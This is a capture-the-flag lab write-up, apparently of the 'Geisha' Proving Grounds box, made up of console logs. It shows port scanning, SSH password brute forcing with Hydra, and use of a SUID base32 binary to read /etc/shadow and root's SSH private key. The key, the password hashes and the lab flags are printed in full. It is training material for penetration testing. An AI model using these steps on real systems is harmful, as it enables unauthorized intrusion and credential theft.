# Recon

```console
root@kali:/OSCPv3/offsec_pg/Geisha# nmap -Pn -sT -sV -n 192.168.133.82 -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-26 16:19 CST
Warning: 192.168.84.82 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.133.82
Host is up (0.077s latency).
Not shown: 65329 closed ports, 199 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
7080/tcp open  ssl/empowerid LiteSpeed
7125/tcp open  http          nginx 1.17.10
8088/tcp open  http          LiteSpeed httpd
9198/tcp open  http          SimpleHTTPServer 0.6 (Python 2.7.16)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.17 seconds
```

## FTP TCP/21
```console
root@kali:/OSCPv3/offsec_pg/Geisha# ftp 192.168.133.82
Connected to 192.168.133.82.
220 (vsFTPd 3.0.3)
Name (192.168.84.82:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> quit
221 Goodbye.
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# searchsploit vsftp
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                              | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                        | unix/remote/17491.rb
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

# HTTP TCP/80
```console
root@kali:/OSCPv3/offsec_pg/Geisha# nmap -Pn -sT -sV --script http-enum -n 192.168.133.82 -p 80 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-26 16:25 CST
Nmap scan report for 192.168.133.82
Host is up (0.075s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-enum: 
|_  /info.php: Possible information file
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.97 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# curl http://192.168.133.82
<body on contextmenu="return false;">

<html>

<head>

<title>Geisha</title>

</head>

<body bgcolor="#FFFFFF">

<center>

<img src="image.png" class="center" align="center" >
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# curl http://192.168.133.82/info.php
1
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# python3 /opt/dirsearch/dirsearch.py -u http://192.168.133.82/ -e php,txt,htm,html,xml -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, htm, html, xml | HTTP method: get | Threads: 10 | Wordlist size: 7509

Error Log: /opt/dirsearch/logs/errors-21-11-26_16-30-41.log

Target: http://192.168.133.82/

[16:30:41] Starting: 
[16:31:20] 200 -  176B  - /index.html
[16:31:21] 200 -    2B  - /info.php

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# python3 /opt/dirsearch/dirsearch.py -u http://192.168.133.82/ -e php,txt,htm,html,xml -x 403 -w /usr/share/dirb/wordlists/common.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, htm, html, xml | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /opt/dirsearch/logs/errors-21-11-26_16-33-34.log

Target: http://192.168.133.82/

[16:33:34] Starting: 
[16:33:35] 200 -  176B  - /
[16:33:52] 200 -  176B  - /index.html
[16:33:52] 200 -    2B  - /info.php

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# python3 /opt/dirsearch/dirsearch.py -u http://192.168.133.82/ -e php,txt,htm,html,xml -x 403 -w /usr/share/dirb/wordlists/big.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, htm, html, xml | HTTP method: get | Threads: 10 | Wordlist size: 20469

Error Log: /opt/dirsearch/logs/errors-21-11-26_16-44-34.log

Target: http://192.168.133.82/

[16:44:35] Starting: 

Task Completed
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# python3 /opt/dirsearch/dirsearch.py -u http://192.168.133.82/ -e php,txt,htm,html,xml -x 403 /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, htm, html, xml | HTTP method: get | Threads: 10 | Wordlist size: 7509

Error Log: /opt/dirsearch/logs/errors-21-11-26_16-48-22.log

Target: http://192.168.133.82/

[16:48:22] Starting: 
[16:49:02] 200 -  176B  - /index.html
[16:49:02] 200 -    2B  - /info.php

Task Completed
```


# HTTP TCP/7125 

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Geisha/img/1.png)

```console
root@kali:/OSCPv3/offsec_pg/Geisha# curl http://192.168.133.82:7125/
<body oncontextmenu="return false;">

<html>

<head>

<title>Geisha</title>

</head>

<body bgcolor="#FFFFFF">

<center>

<img src="image.png" class="center" align="center" >
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# nmap -Pn -sT -sV --script http-enum 192.168.133.82 -p 7125
Starting Nmap 7.70 ( https://nmap.org ) at 2021-11-26 16:53 CST
Nmap scan report for 192.168.84.82
Host is up (0.073s latency).

PORT     STATE SERVICE VERSION
7125/tcp open  http    nginx 1.17.10
|_http-server-header: nginx/1.17.10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 180.99 seconds
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# python3 /opt/dirsearch/dirsearch.py -u http://192.168.133.82:7125/ -w /usr/share/dirb/wordlists/common.txt -x 403 -e php,html,txt

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, html, txt | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /opt/dirsearch/logs/errors-21-11-27_09-47-06.log

Target: http://192.168.133.82:7125/

[09:47:06] Starting: 
[09:47:07] 200 -  175B  - /
[09:47:30] 200 -  175B  - /index.php
[09:47:39] 200 -    1KB - /passwd

Task Completed
```
# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Geisha# curl http://192.168.133.82:7125/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# curl http://192.168.133.82:7125/passwd | grep bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1432  100  1432    0     0   7054      0 --:--:-- --:--:-- --:--:--  7054
root:x:0:0:root:/root:/bin/bash
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.133.82 ssh
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-11-27 09:52:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:0), ~14344399 tries per task
[DATA] attacking ssh://192.168.133.82:22/
[STATUS] 209.00 tries/min, 209 tries in 00:00h, 0 to do in 01:00h, 14344193 active
[22][ssh] host: 192.168.133.82   login: geisha   password: letmein
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2021-11-27 09:55:33
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# ssh geisha@192.168.133.82
The authenticity of host '192.168.133.82 (192.168.133.82)' can't be established.
ECDSA key fingerprint is SHA256:VZJ2vD6+/BC5zd9v8nRSgqEHyfR17GuCELg0nE0BkFk.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.133.82' (ECDSA) to the list of known hosts.
geisha@192.168.133.82's password: 
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
geisha@geisha:~$ whoami
geisha
```

```console
geisha@geisha:~$ cat local.txt 
13cdcae29b8f00b209d49e1285ede5bf
```

# Privilege escalation

```console
geisha@geisha:~$ sudo -l
[sudo] password for geisha: 
Sorry, user geisha may not run sudo on geisha.
```

```console
geisha@geisha:/var/www/html$ ls -la
total 220
drwxr-xr-x 2 root root   4096 May  9  2020 .
drwxr-xr-x 3 root root   4096 May  9  2020 ..
-rw-r--r-- 1 root root 207021 Jul  1  2019 image.png
-rw-r--r-- 1 root root    176 May  9  2020 index.html
-rw-r--r-- 1 root root      2 May  9  2020 info.php
```


```console
geisha@geisha:/opt/nginx/www$ ls -la
total 224
drwxr-xr-x 2 root     root       4096 May  9  2020 .
drwxr-xr-x 3 root     root       4096 May  9  2020 ..
-rw-r--r-- 1 root     root     207021 May  9  2020 image.png
-rw-r--r-- 1 root     root        175 May  9  2020 index.php
-rw-r--r-- 1 www-data www-data   1432 May  9  2020 passwd
-rw-r----- 1 www-data www-data    941 May  9  2020 shadow
```

```console
geisha@geisha:/usr/share/nginx/html$ ls -la
total 216
drwxr-xr-x 2 root root   4096 May  9  2020 .
drwxr-xr-x 4 root root   4096 May  9  2020 ..
-rw-r--r-- 1 root root 207021 May  9  2020 image.png
-rw-r--r-- 1 root root    176 May  9  2020 index.html
```

```console
geisha@geisha:/opt/containerd$ ls -la /mnt/html/
total 220
drwxr-xr-x 2 root root   4096 May  9  2020 .
drwxr-xr-x 3 root root   4096 May  9  2020 ..
-rw-r--r-- 1 root root 207021 May  9  2020 image.png
-rw-r--r-- 1 root root    176 May  9  2020 index.html
-rw-r--r-- 1 root root      2 May  9  2020 info.php
```

```console
geisha@geisha:/opt/containerd$ getcap -r / 2>/dev/null
geisha@geisha:/opt/containerd$
```

```console
geisha@geisha:/home$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

```console
geisha@geisha:/home$ find / -uid 0 -perm -4000 -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/umount
/usr/bin/su
/usr/bin/chsh
/usr/bin/base32
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
```

```console
geisha@geisha:/home$ /usr/bin/base32 /etc/shadow | base32 --decode
root:$6$3haFwrdHJRZKWD./$LYiTApGClgwmFE3TXMRtekWpGOY6fSpnTorsQL/FBr9YdOW4NHMzYFkOLu8qJQVa1wqfEC3a.SZeTHIyEhlPF0:18446:0:99999:7:::
daemon:*:18385:0:99999:7:::
bin:*:18385:0:99999:7:::
sys:*:18385:0:99999:7:::
sync:*:18385:0:99999:7:::
games:*:18385:0:99999:7:::
man:*:18385:0:99999:7:::
lp:*:18385:0:99999:7:::
mail:*:18385:0:99999:7:::
news:*:18385:0:99999:7:::
uucp:*:18385:0:99999:7:::
proxy:*:18385:0:99999:7:::
www-data:*:18385:0:99999:7:::
backup:*:18385:0:99999:7:::
list:*:18385:0:99999:7:::
irc:*:18385:0:99999:7:::
gnats:*:18385:0:99999:7:::
nobody:*:18385:0:99999:7:::
_apt:*:18385:0:99999:7:::
systemd-timesync:*:18385:0:99999:7:::
systemd-network:*:18385:0:99999:7:::
systemd-resolve:*:18385:0:99999:7:::
messagebus:*:18385:0:99999:7:::
sshd:*:18385:0:99999:7:::
geisha:$6$YtDFbbhHHf5Ag5ej$3EjLFKW1aSNBlfAhcyjmY97eLrNtbzDWQ9z5YvSvuA65kH7ZgHR1f9VGFhAEGGqiKAtF8//U45M8QOHouQrWb.:18494:0:99999:7:::
systemd-coredump:!!:18385::::::
ftp:*:18391:0:99999:7:::
```

```console
geisha@geisha:/home$ /usr/bin/base32 /etc/passwd | base32 --decode
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
geisha:x:1000:1000:geisha,,,:/home/geisha:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lsadm:x:998:1001::/:/sbin/nologin
ftp:x:106:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# nano shadow
root@kali:/OSCPv3/offsec_pg/Geisha# nano passwd
```

```console
root@kali:/OSCPv3/offsec_pg/Geisha# unshadow passwd shadow > crack
root@kali:/OSCPv3/offsec_pg/Geisha# john --wordlist=/usr/share/wordlists/rockyou.txt crack 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (geisha)
....
....
```

```console
geisha@geisha:/home$ /usr/bin/base32 /root/proof.txt | base32 --decode
4fb84f2787a12ca9eb3d20256ff9b9e4
```

```console
geisha@geisha:/home$ /usr/bin/base32 /root/.ssh/id_rsa | base32 --decode
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA43eVw/8oSsnOSPCSyhVEnt01fIwy1YZUpEMPQ8pPkwX5uPh4
OZXrITY3JqYSCFcgJS34/TQkKLp7iG2WGmnno/Op4GchXEdSklwoGOKNA22l7pX5
89FAL1XSEBCtzlrCrksvfX08+y7tS/I8s41w4aC1TDd5o8c1Kx5lfwl7qw0ZMlbd
5yeAUhuxuvxo/KFqiUUfpcpoBf3oT2K97/bZr059VU8T4wd5LkCzKEKmK5ebWIB6
fgIfxyhEm/o3dl1lhegTtzC6PtlhuT7ty//mqEeMuipwH3ln61fHXs72LI/vTx26
TSSmzHo8zZt+/lwrgroh0ByXbCtDaZjo4HAFfQIDAQABAoIBAQCRXy/b3wpFIcww
WW+2rvj3/q/cNU2XoQ4fHKx4yqcocz0xtbpAM0veIeQFU0VbBzOID2V9jQE+9k9U
1ZSEtQJRibwbqk1ryDlBSJxnqwIsGrtdS4Q/CpBWsCZcFgy+QMsC0RI8xPlgHpGR
Y/LfXZmy2R6E4z9eKEYWlIqRMeJTYgqsP6ZR4SOLuZS1Aq/lq/v9jqGs/SQenjRb
8zt1BoqCfOp5TtY1NoBLqaPwmDt8+rlQt1IM+2aYmxdUkLFTcMpCGMADggggtnR+
10pZkA6wM8/FlxyAFcNwt+H3xu5VKuQKdqTfh1EuO3c34UmuS1qnidHO1rYWOhYO
jceQYzoBAoGBAP/Ml6cp2OWqrheJS9Pgnvz82n+s9yM5raKNnH57j0sbEp++eG7o
2po5/vrLBcCHGqZ7+RNFXDmRBEMToru/m2RikSVYk8QHLxVZJt5iB3tcxmglGJj/
cLkGM71JqjHX/edwu2nNu14m4l1JV9LGvvHR5m6uU5cQvdcMTsRpkuxdAoGBAOOl
THxiQ6R6HkOt9w/WrKDIeGskIXj/P/79aB/2p17M6K+cy75OOYzqkDPENrxK8bub
RaTzq4Zl2pAqxvsv/CHuJU/xHs9T3Ox7A1hWqnOOk2f0KBmhQTYBs2OKqXXZotHH
xvkOgc0fqRm1QYlCK2lyBBM14O5Isud1ZZXLUOuhAoGBAIBds1z36xiV5nd5NsxE
1IQwf5XCvuK2dyQz3Gy8pNQT6eywMM+3mrv6jrJcX66WHhGd9QhurjFVTMY8fFWr
edeOfzg2kzC0SjR0YMUIfKizjf2FYCqnRXIUYrKC3R3WPlx+fg5CZ9x/tukJfUEQ
65F+vBye7uPISvw3+O8n68shAoGABXMyppOvrONjkBk9Hfr0vRCvmVkPGBd8T71/
XayJC0L6myG02wSCajY/Z43eBZoBuY0ZGL7gr2IG3oa3ptHaRnGuIQDTzQDj/CFh
zh6dDBEwxD9bKmnq5sEZq1tpfTHNrRoMUHAheWi1orDtNb0Izwh0woT6spm49sOf
v/tTH6ECgYEA/tBeKSVGm0UxGrjpQmhW/9Po62JNz6ZBaTELm3paaxqGtA+0HD0M
OuzD6TBG6zBF6jW8VLQfiQzIMEUcGa8iJXhI6bemiX6Te1PWC8NMMULhCjObMjCv
bf+qz0sVYfPb95SQb4vvFjp5XDVdAdtQov7s7XmHyJbZ48r8ISHm98s=
-----END RSA PRIVATE KEY-----
``` 

```console
root@kali:/OSCPv3/offsec_pg/Geisha# ssh -i id_rsa root@192.168.133.82
Linux geisha 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1+deb10u1 (2020-04-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@geisha:~# whoami
root
root@geisha:~# cat /root/proof.txt 
4fb84f2787a12ca9eb3d20256ff9b9e4
```

https://www.tunnelsup.com/hash-analyzer/

https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

https://github.com/Freeguy1/Wordlistss/blob/master/realhuman_phill.txt


